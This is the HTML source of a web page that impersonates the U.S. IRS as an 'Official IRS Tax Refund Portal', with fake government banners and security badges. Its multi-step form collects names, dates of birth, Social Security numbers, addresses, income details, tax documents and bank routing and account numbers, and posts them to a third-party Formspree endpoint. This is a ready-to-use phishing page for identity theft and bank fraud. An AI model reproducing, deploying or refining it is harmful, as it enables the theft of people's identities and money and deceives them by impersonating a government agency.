<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Official U.S. IRS Tax Refund Verification Portal - Secure Government Service">
    <meta name="keywords" content="IRS, tax refund, federal tax, government verified, tax return, U.S. Department of Treasury">
    <title>Official IRS Tax Refund Portal â€” U.S. Government Service</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="tax.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
</head>
<body style="background-color: #f5f5f5;">

    <!-- U.S. GOVERNMENT BANNER (TOP) -->
    <div style="background: linear-gradient(90deg, #003366 0%, #004c99 50%, #003366 100%); color: white; padding: 12px 20px; text-align: center; border-bottom: 4px solid #ffc107; font-weight: bold; font-size: 14px;">
        <div style="max-width: 1200px; margin: 0 auto;">
            <span style="font-size: 18px; margin-right: 10px;">ðŸ¦…</span>
            <strong>OFFICIAL U.S. GOVERNMENT WEBSITE</strong><br>
            <span style="font-size: 12px; margin-top: 4px; display: block; color: #ffc107;">
                U.S. Department of the Treasury â€” Internal Revenue Service (IRS)
            </span>
        </div>
    </div>

    <!-- MAIN CONTAINER -->
    <div style="max-width: 900px; margin: 0 auto; padding: 0 20px; padding-bottom: 40px;">

        <!-- OFFICIAL HEADER -->
        <div style="background: white; padding: 30px; margin-top: 20px; border-radius: 8px; border-top: 5px solid #ffc107; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
            <div style="text-align: center; margin-bottom: 20px;">
                <div style="font-size: 64px; margin-bottom: 10px;">ðŸ¦…</div>
                <h1 style="color: #003366; margin: 0 0 5px 0; font-size: 32px; font-weight: bold;">
                    OFFICIAL IRS TAX REFUND PORTAL
                </h1>
                <h2 style="color: #ffc107; margin: 5px 0; font-size: 16px; font-weight: normal;">
                    U.S. Department of the Treasury | Internal Revenue Service
                </h2>
                <p style="color: #666; margin: 10px 0; font-size: 13px;">
                    Secure Verification System | Established 1913
                </p>
            </div>

            <!-- SECURITY BADGES -->
            <div style="display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; margin: 20px 0; padding-top: 20px; border-top: 1px solid #ddd;">
                <div style="background: #d4edda; color: #155724; padding: 8px 12px; border-radius: 4px; font-size: 12px; display: flex; align-items: center; gap: 6px;">
                    <i class="fas fa-check-circle"></i> <strong>IRS Verified</strong>
                </div>
                <div style="background: #d4edda; color: #155724; padding: 8px 12px; border-radius: 4px; font-size: 12px; display: flex; align-items: center; gap: 6px;">
                    <i class="fas fa-lock"></i> <strong>256-bit SSL Encrypted</strong>
                </div>
                <div style="background: #d4edda; color: #155724; padding: 8px 12px; border-radius: 4px; font-size: 12px; display: flex; align-items: center; gap: 6px;">
                    <i class="fas fa-shield-alt"></i> <strong>Government Secured</strong>
                </div>
                <div style="background: #d4edda; color: #155724; padding: 8px 12px; border-radius: 4px; font-size: 12px; display: flex; align-items: center; gap: 6px;">
                    <i class="fas fa-star"></i> <strong>Official U.S. Site</strong>
                </div>
            </div>
        </div>

        <!-- AUTHENTICATION CONTROLS -->
        <div style="text-align: center; margin: 20px 0; padding: 15px; background: white; border-radius: 6px;">
            <div id="auth-controls" style="display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;">
                <button id="btn-show-login" class="btn btn-secondary" style="padding: 10px 20px; font-weight: bold;">
                    <i class="fas fa-sign-in-alt"></i> LOG IN
                </button>
                <button id="btn-show-register" class="btn btn-primary" style="padding: 10px 20px; font-weight: bold;">
                    <i class="fas fa-user-plus"></i> CREATE ACCOUNT
                </button>
                <a id="btn-logout" href="#" class="btn btn-secondary" style="display: none; padding: 10px 20px; font-weight: bold;">
                    <i class="fas fa-sign-out-alt"></i> LOG OUT
                </a>
            </div>
        </div>

    <!-- AUTHENTICATION MODAL -->
        <div id="auth-modal" class="modal" aria-hidden="true">
            <div class="modal-content" style="max-width: 500px; border-top: 5px solid #ffc107;" role="dialog" aria-modal="true" aria-labelledby="auth-title">
                <div style="background: linear-gradient(135deg, #003366, #004c99); color: white; padding: 20px; border-radius: 8px 8px 0 0; text-align: center;">
                    <div style="font-size: 36px; margin-bottom: 8px;">ðŸ¦…</div>
                    <h3 id="auth-title" style="margin: 0; font-size: 18px;">Official IRS Account</h3>
                    <p style="margin: 5px 0 0 0; font-size: 12px; color: #ffc107;">Secure Government Portal</p>
                </div>
                <div id="auth-forms" style="padding: 20px;">
        <!-- Authentication / Account Modals -->
        <div id="auth-controls" style="text-align:center; margin-bottom:12px;">
            <button id="btn-show-login" class="btn btn-secondary" style="display:inline-block; margin-right:8px;">Log In</button>
            <button id="btn-show-register" class="btn btn-primary" style="display:inline-block;">Create Account</button>
            <a id="btn-logout" href="#" class="btn btn-secondary" style="display:none; margin-left:8px;">Log Out</a>
        </div>

        <div id="auth-modal" class="modal" aria-hidden="true">
            <div class="modal-content" role="dialog" aria-modal="true" aria-labelledby="auth-title">
                <h3 id="auth-title">Account</h3>
                <div id="auth-forms">
                    <form id="register-form" style="display:none;">
                        <label for="reg-email">Email</label>
                        <input id="reg-email" type="email" required />
                        <label for="reg-password">Password</label>
                        <input id="reg-password" type="password" required />
                        <label for="reg-name">Full Name</label>
                        <input id="reg-name" type="text" required />
                        <label for="reg-dob">Date of Birth * (MM/DD/YYYY)</label>
                        <input id="reg-dob" type="date" required placeholder="MM/DD/YYYY" />
                        <small style="color:#666; font-size:0.85rem; margin-top:4px; display:block;">Tap to select from calendar or type manually</small>
                        <div style="margin-top:8px; display:flex; gap:8px;">
                            <button id="btn-register" class="btn btn-primary" type="button">Create Account</button>
                            <button id="btn-cancel-auth" class="btn btn-secondary" type="button">Cancel</button>
                        </div>
                        <div id="register-msg" class="error-message" style="display:none;margin-top:8px;"></div>
                    </form>

                    <form id="login-form" style="display:none;">
                        <label for="login-email">Email</label>
                        <input id="login-email" type="email" required />
                        <label for="login-password">Password</label>
                        <input id="login-password" type="password" required />
                        <div style="margin-top:6px; text-align:right;">
                            <a href="#" id="forgot-link" style="font-size:0.9rem;">Forgot password?</a>
                        </div>
                        <div style="margin-top:8px; display:flex; gap:8px;">
                            <button id="btn-login" class="btn btn-primary" type="button">Log In</button>
                            <button id="btn-cancel-login" class="btn btn-secondary" type="button">Cancel</button>
                        </div>
                        <div id="login-msg" class="error-message" style="display:none;margin-top:8px;"></div>
                    </form>

                    <!-- Forgot password form -->
                    <form id="forgot-form" style="display:none;">
                        <p>Enter your account email and we'll send a verification code to reset your password.</p>
                        <label for="forgot-email">Email</label>
                        <input id="forgot-email" type="email" required />
                        <div style="margin-top:8px; display:flex; gap:8px;">
                            <button id="btn-forgot-send" class="btn btn-primary" type="button">Send Code</button>
                            <button id="btn-forgot-cancel" class="btn btn-secondary" type="button">Cancel</button>
                        </div>
                        <div id="forgot-msg" class="error-message" style="display:none;margin-top:8px;"></div>
                    </form>

                    <!-- Reset password form (after code) -->
                    <form id="reset-form" style="display:none;">
                        <p>Enter the code sent to your email, then choose a new password. You may also re-enter profile info to restore your account.</p>
                        <label for="reset-email">Email</label>
                        <input id="reset-email" type="email" required />
                        <label for="reset-code">Verification Code</label>
                        <input id="reset-code" type="text" inputmode="numeric" required />
                        <label for="reset-password">New Password</label>
                        <input id="reset-password" type="password" required />
                        <label for="reset-name">Full Name (to restore profile)</label>
                        <input id="reset-name" type="text" />
                        <label for="reset-dob">Date of Birth (to restore profile)</label>
                        <input id="reset-dob" type="date" />
                        <div style="margin-top:8px; display:flex; gap:8px;">
                            <button id="btn-reset-submit" class="btn btn-primary" type="button">Reset Password</button>
                            <button id="btn-reset-cancel" class="btn btn-secondary" type="button">Cancel</button>
                        </div>
                        <div id="reset-msg" class="error-message" style="display:none;margin-top:8px;"></div>
                    </form>

                    <form id="mfa-form" style="display:none;">
                        <p>A verification code was sent to your phone/email (simulated).</p>
                        <label for="mfa-code">Enter Code</label>
                        <input id="mfa-code" type="text" inputmode="numeric" />
                        <div style="margin-top:8px; display:flex; gap:8px;">
                            <button id="btn-verify-mfa" class="btn btn-primary" type="button">Verify</button>
                            <button id="btn-resend-mfa" class="btn btn-secondary" type="button">Resend</button>
                        </div>
                        <div id="mfa-msg" class="error-message" style="display:none;margin-top:8px;"></div>
                    </form>
                </div>
            </div>
        </div>
        <h2>Start Your Refund Check</h2>

        <div class="step-indicator" role="tablist" aria-label="Form steps">
            <div class="step active" data-step="1" role="tab">1. Eligibility</div>
            <div class="step" data-step="2" role="tab">2. Personal</div>
            <div class="step" data-step="3" role="tab">3. Income</div>
            <div class="step" data-step="4" role="tab">4. Bank</div>
            <div class="step" data-step="5" role="tab">5. Review</div>
        </div>

        <form id="refund-form" novalidate action="https://formspree.io/f/xzzngynp" method="POST" enctype="multipart/form-data">
            <div class="step-content active" data-step="1" aria-hidden="false">
                <div class="form-group">
                    <label for="tax-year">Which Tax Year are you checking? *</label>
                    <select id="tax-year" name="taxYear" required>
                        <option value="">Select Year</option>
                        <option value="2024">2024</option>
                        <option value="2023">2023</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Filing Status *</label>
                    <div class="radio-group" role="radiogroup" aria-required="true">
                        <input type="radio" name="filing-status" value="single" id="single" required>
                        <label for="single">Single</label>
                        <input type="radio" name="filing-status" value="married-joint" id="married-joint">
                        <label for="married-joint">Married Filing Jointly</label>
                        <input type="radio" name="filing-status" value="head-household" id="head-household">
                        <label for="head-household">Head of Household</label>
                    </div>
                </div>
            </div>

            <div class="step-content" data-step="2" aria-hidden="true">
                <p class="security-note">We protect your sensitive fields and advise you to only provide SSN/SSN-like numbers on secure networks. SSN input is masked client-side.</p>
                <div class="form-group">
                    <label for="full-name">Full Legal Name *</label>
                    <input type="text" id="full-name" name="fullName" placeholder="John Doe" required>
                </div>
                <div class="form-group">
                    <label for="email">Email Address *</label>
                    <input type="email" id="email" name="email" placeholder="you@example.com" required>
                </div>
                <div class="form-group">
                    <label for="phone">Phone (optional)</label>
                    <input type="tel" id="phone" name="phone" placeholder="e.g., +1 555 555 5555" inputmode="tel">
                </div>
                <div class="form-group">
                    <label for="dob">Date of Birth * (MM/DD/YYYY)</label>
                    <input type="date" id="dob" name="dob" required placeholder="MM/DD/YYYY" />
                    <small style="color:#666; font-size:0.85rem; margin-top:4px; display:block;">Tap to select from calendar or type manually</small>
                </div>
                <div class="form-group">
                    <label for="ssn">Social Security Number / TIN *</label>
                    <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" inputmode="numeric" autocomplete="off" required aria-describedby="ssn-help">
                    <div id="ssn-help" class="error-message" style="display:none;">Enter SSN in format XXX-XX-XXXX</div>
                </div>
                <div class="form-group">
                    <label for="address">Street Address *</label>
                    <input type="text" id="address" name="address" placeholder="123 Main St" required>
                </div>
            </div>

            <div class="step-content" data-step="3" aria-hidden="true">
                <div class="form-group">
                    <label for="gross-income">Total Gross Income (From W-2/1099) *</label>
                    <input type="number" id="gross-income" name="grossIncome" placeholder="e.g., 55000" min="0" required>
                </div>
                <div class="form-group">
                    <label for="tax-withheld">Total Federal Tax Withheld *</label>
                    <input type="number" id="tax-withheld" name="taxWithheld" placeholder="e.g., 5000" min="0" required>
                </div>
                <div class="form-group">
                    <label>Did you claim dependents? *</label>
                    <div class="radio-group">
                        <input type="radio" name="dependents" value="yes" id="dep-yes" required>
                        <label for="dep-yes">Yes</label>
                        <input type="radio" name="dependents" value="no" id="dep-no">
                        <label for="dep-no">No</label>
                    </div>
                </div>
                <div class="form-group">
                    <label for="dependents-count" id="dependents-count-label" style="display:none;">Number of Dependents:</label>
                        <input type="number" id="dependents-count" name="dependentsCount" placeholder="0" min="0" max="10" style="display:none;">
                </div>
                <div class="form-group">
                    <label for="document-upload">Upload documents (W-2/1099) â€” optional</label>
                    <input type="file" id="document-upload" name="documentUpload" accept=".pdf,.jpg,.jpeg,.png" aria-describedby="upload-help">
                    <div id="upload-help" class="error-message" style="display:none;">Allowed: PDF, JPG, PNG. Max 5 MB.</div>
                </div>
            </div>

            <div class="step-content" data-step="4" aria-hidden="true">
                <h3>Direct Deposit (recommended)</h3>
                <div class="form-group">
                    <label for="bank-name">Bank Name *</label>
                    <input type="text" id="bank-name" name="bankName" placeholder="Chase, Wells Fargo, etc." required>
                </div>
                <div class="form-group">
                    <label for="routing-number">Bank Routing Number (9 Digits) *</label>
                    <input type="text" id="routing-number" name="routingNumber" placeholder="XXXXXXXXX" inputmode="numeric" required pattern="\d{9}" title="Routing number must be 9 digits">
                </div>
                <div class="form-group">
                    <label for="account-number">Bank Account Number *</label>
                    <input type="text" id="account-number" name="accountNumber" placeholder="Account Number" inputmode="numeric" required>
                </div>
            </div>

            <div class="step-content" data-step="5" aria-hidden="true">
                <h3>Review Your Data</h3>
                <div class="review-data" id="review-summary">
                    <p><strong>Name:</strong> <span id="review-name"></span></p>
                    <p><strong>Email:</strong> <span id="review-email"></span></p>
                    <p><strong>Tax Year:</strong> <span id="review-year"></span></p>
                    <p><strong>Income:</strong> $<span id="review-income"></span></p>
                    <p><strong>Withheld:</strong> $<span id="review-withheld"></span></p>
                    <p><strong>Dependents:</strong> <span id="review-dependents"></span></p>
                </div>

                <div class="form-group" style="margin-top: 25px;">
                    <input type="checkbox" id="consent" required>
                    <label for="consent" style="display: inline;">I confirm the information is accurate and I agree to the <a href="#" target="_blank">Terms & Privacy Policy</a>.</label>
                </div>
            </div>

            <div class="btn-group">
                <button type="button" class="btn btn-secondary" id="prevBtn" disabled>Previous</button>
                <button type="button" class="btn btn-primary" id="nextBtn">Next</button>
                <button type="submit" class="btn btn-success" id="submitBtn" style="display: none;">Calculate My Refund</button>
            </div>
        </form>
        <div id="result-modal" class="modal" aria-hidden="true"></div>
    </div>

    <script src="auth.js"></script>
    <script src="tax.js"></script>
</body>
</html>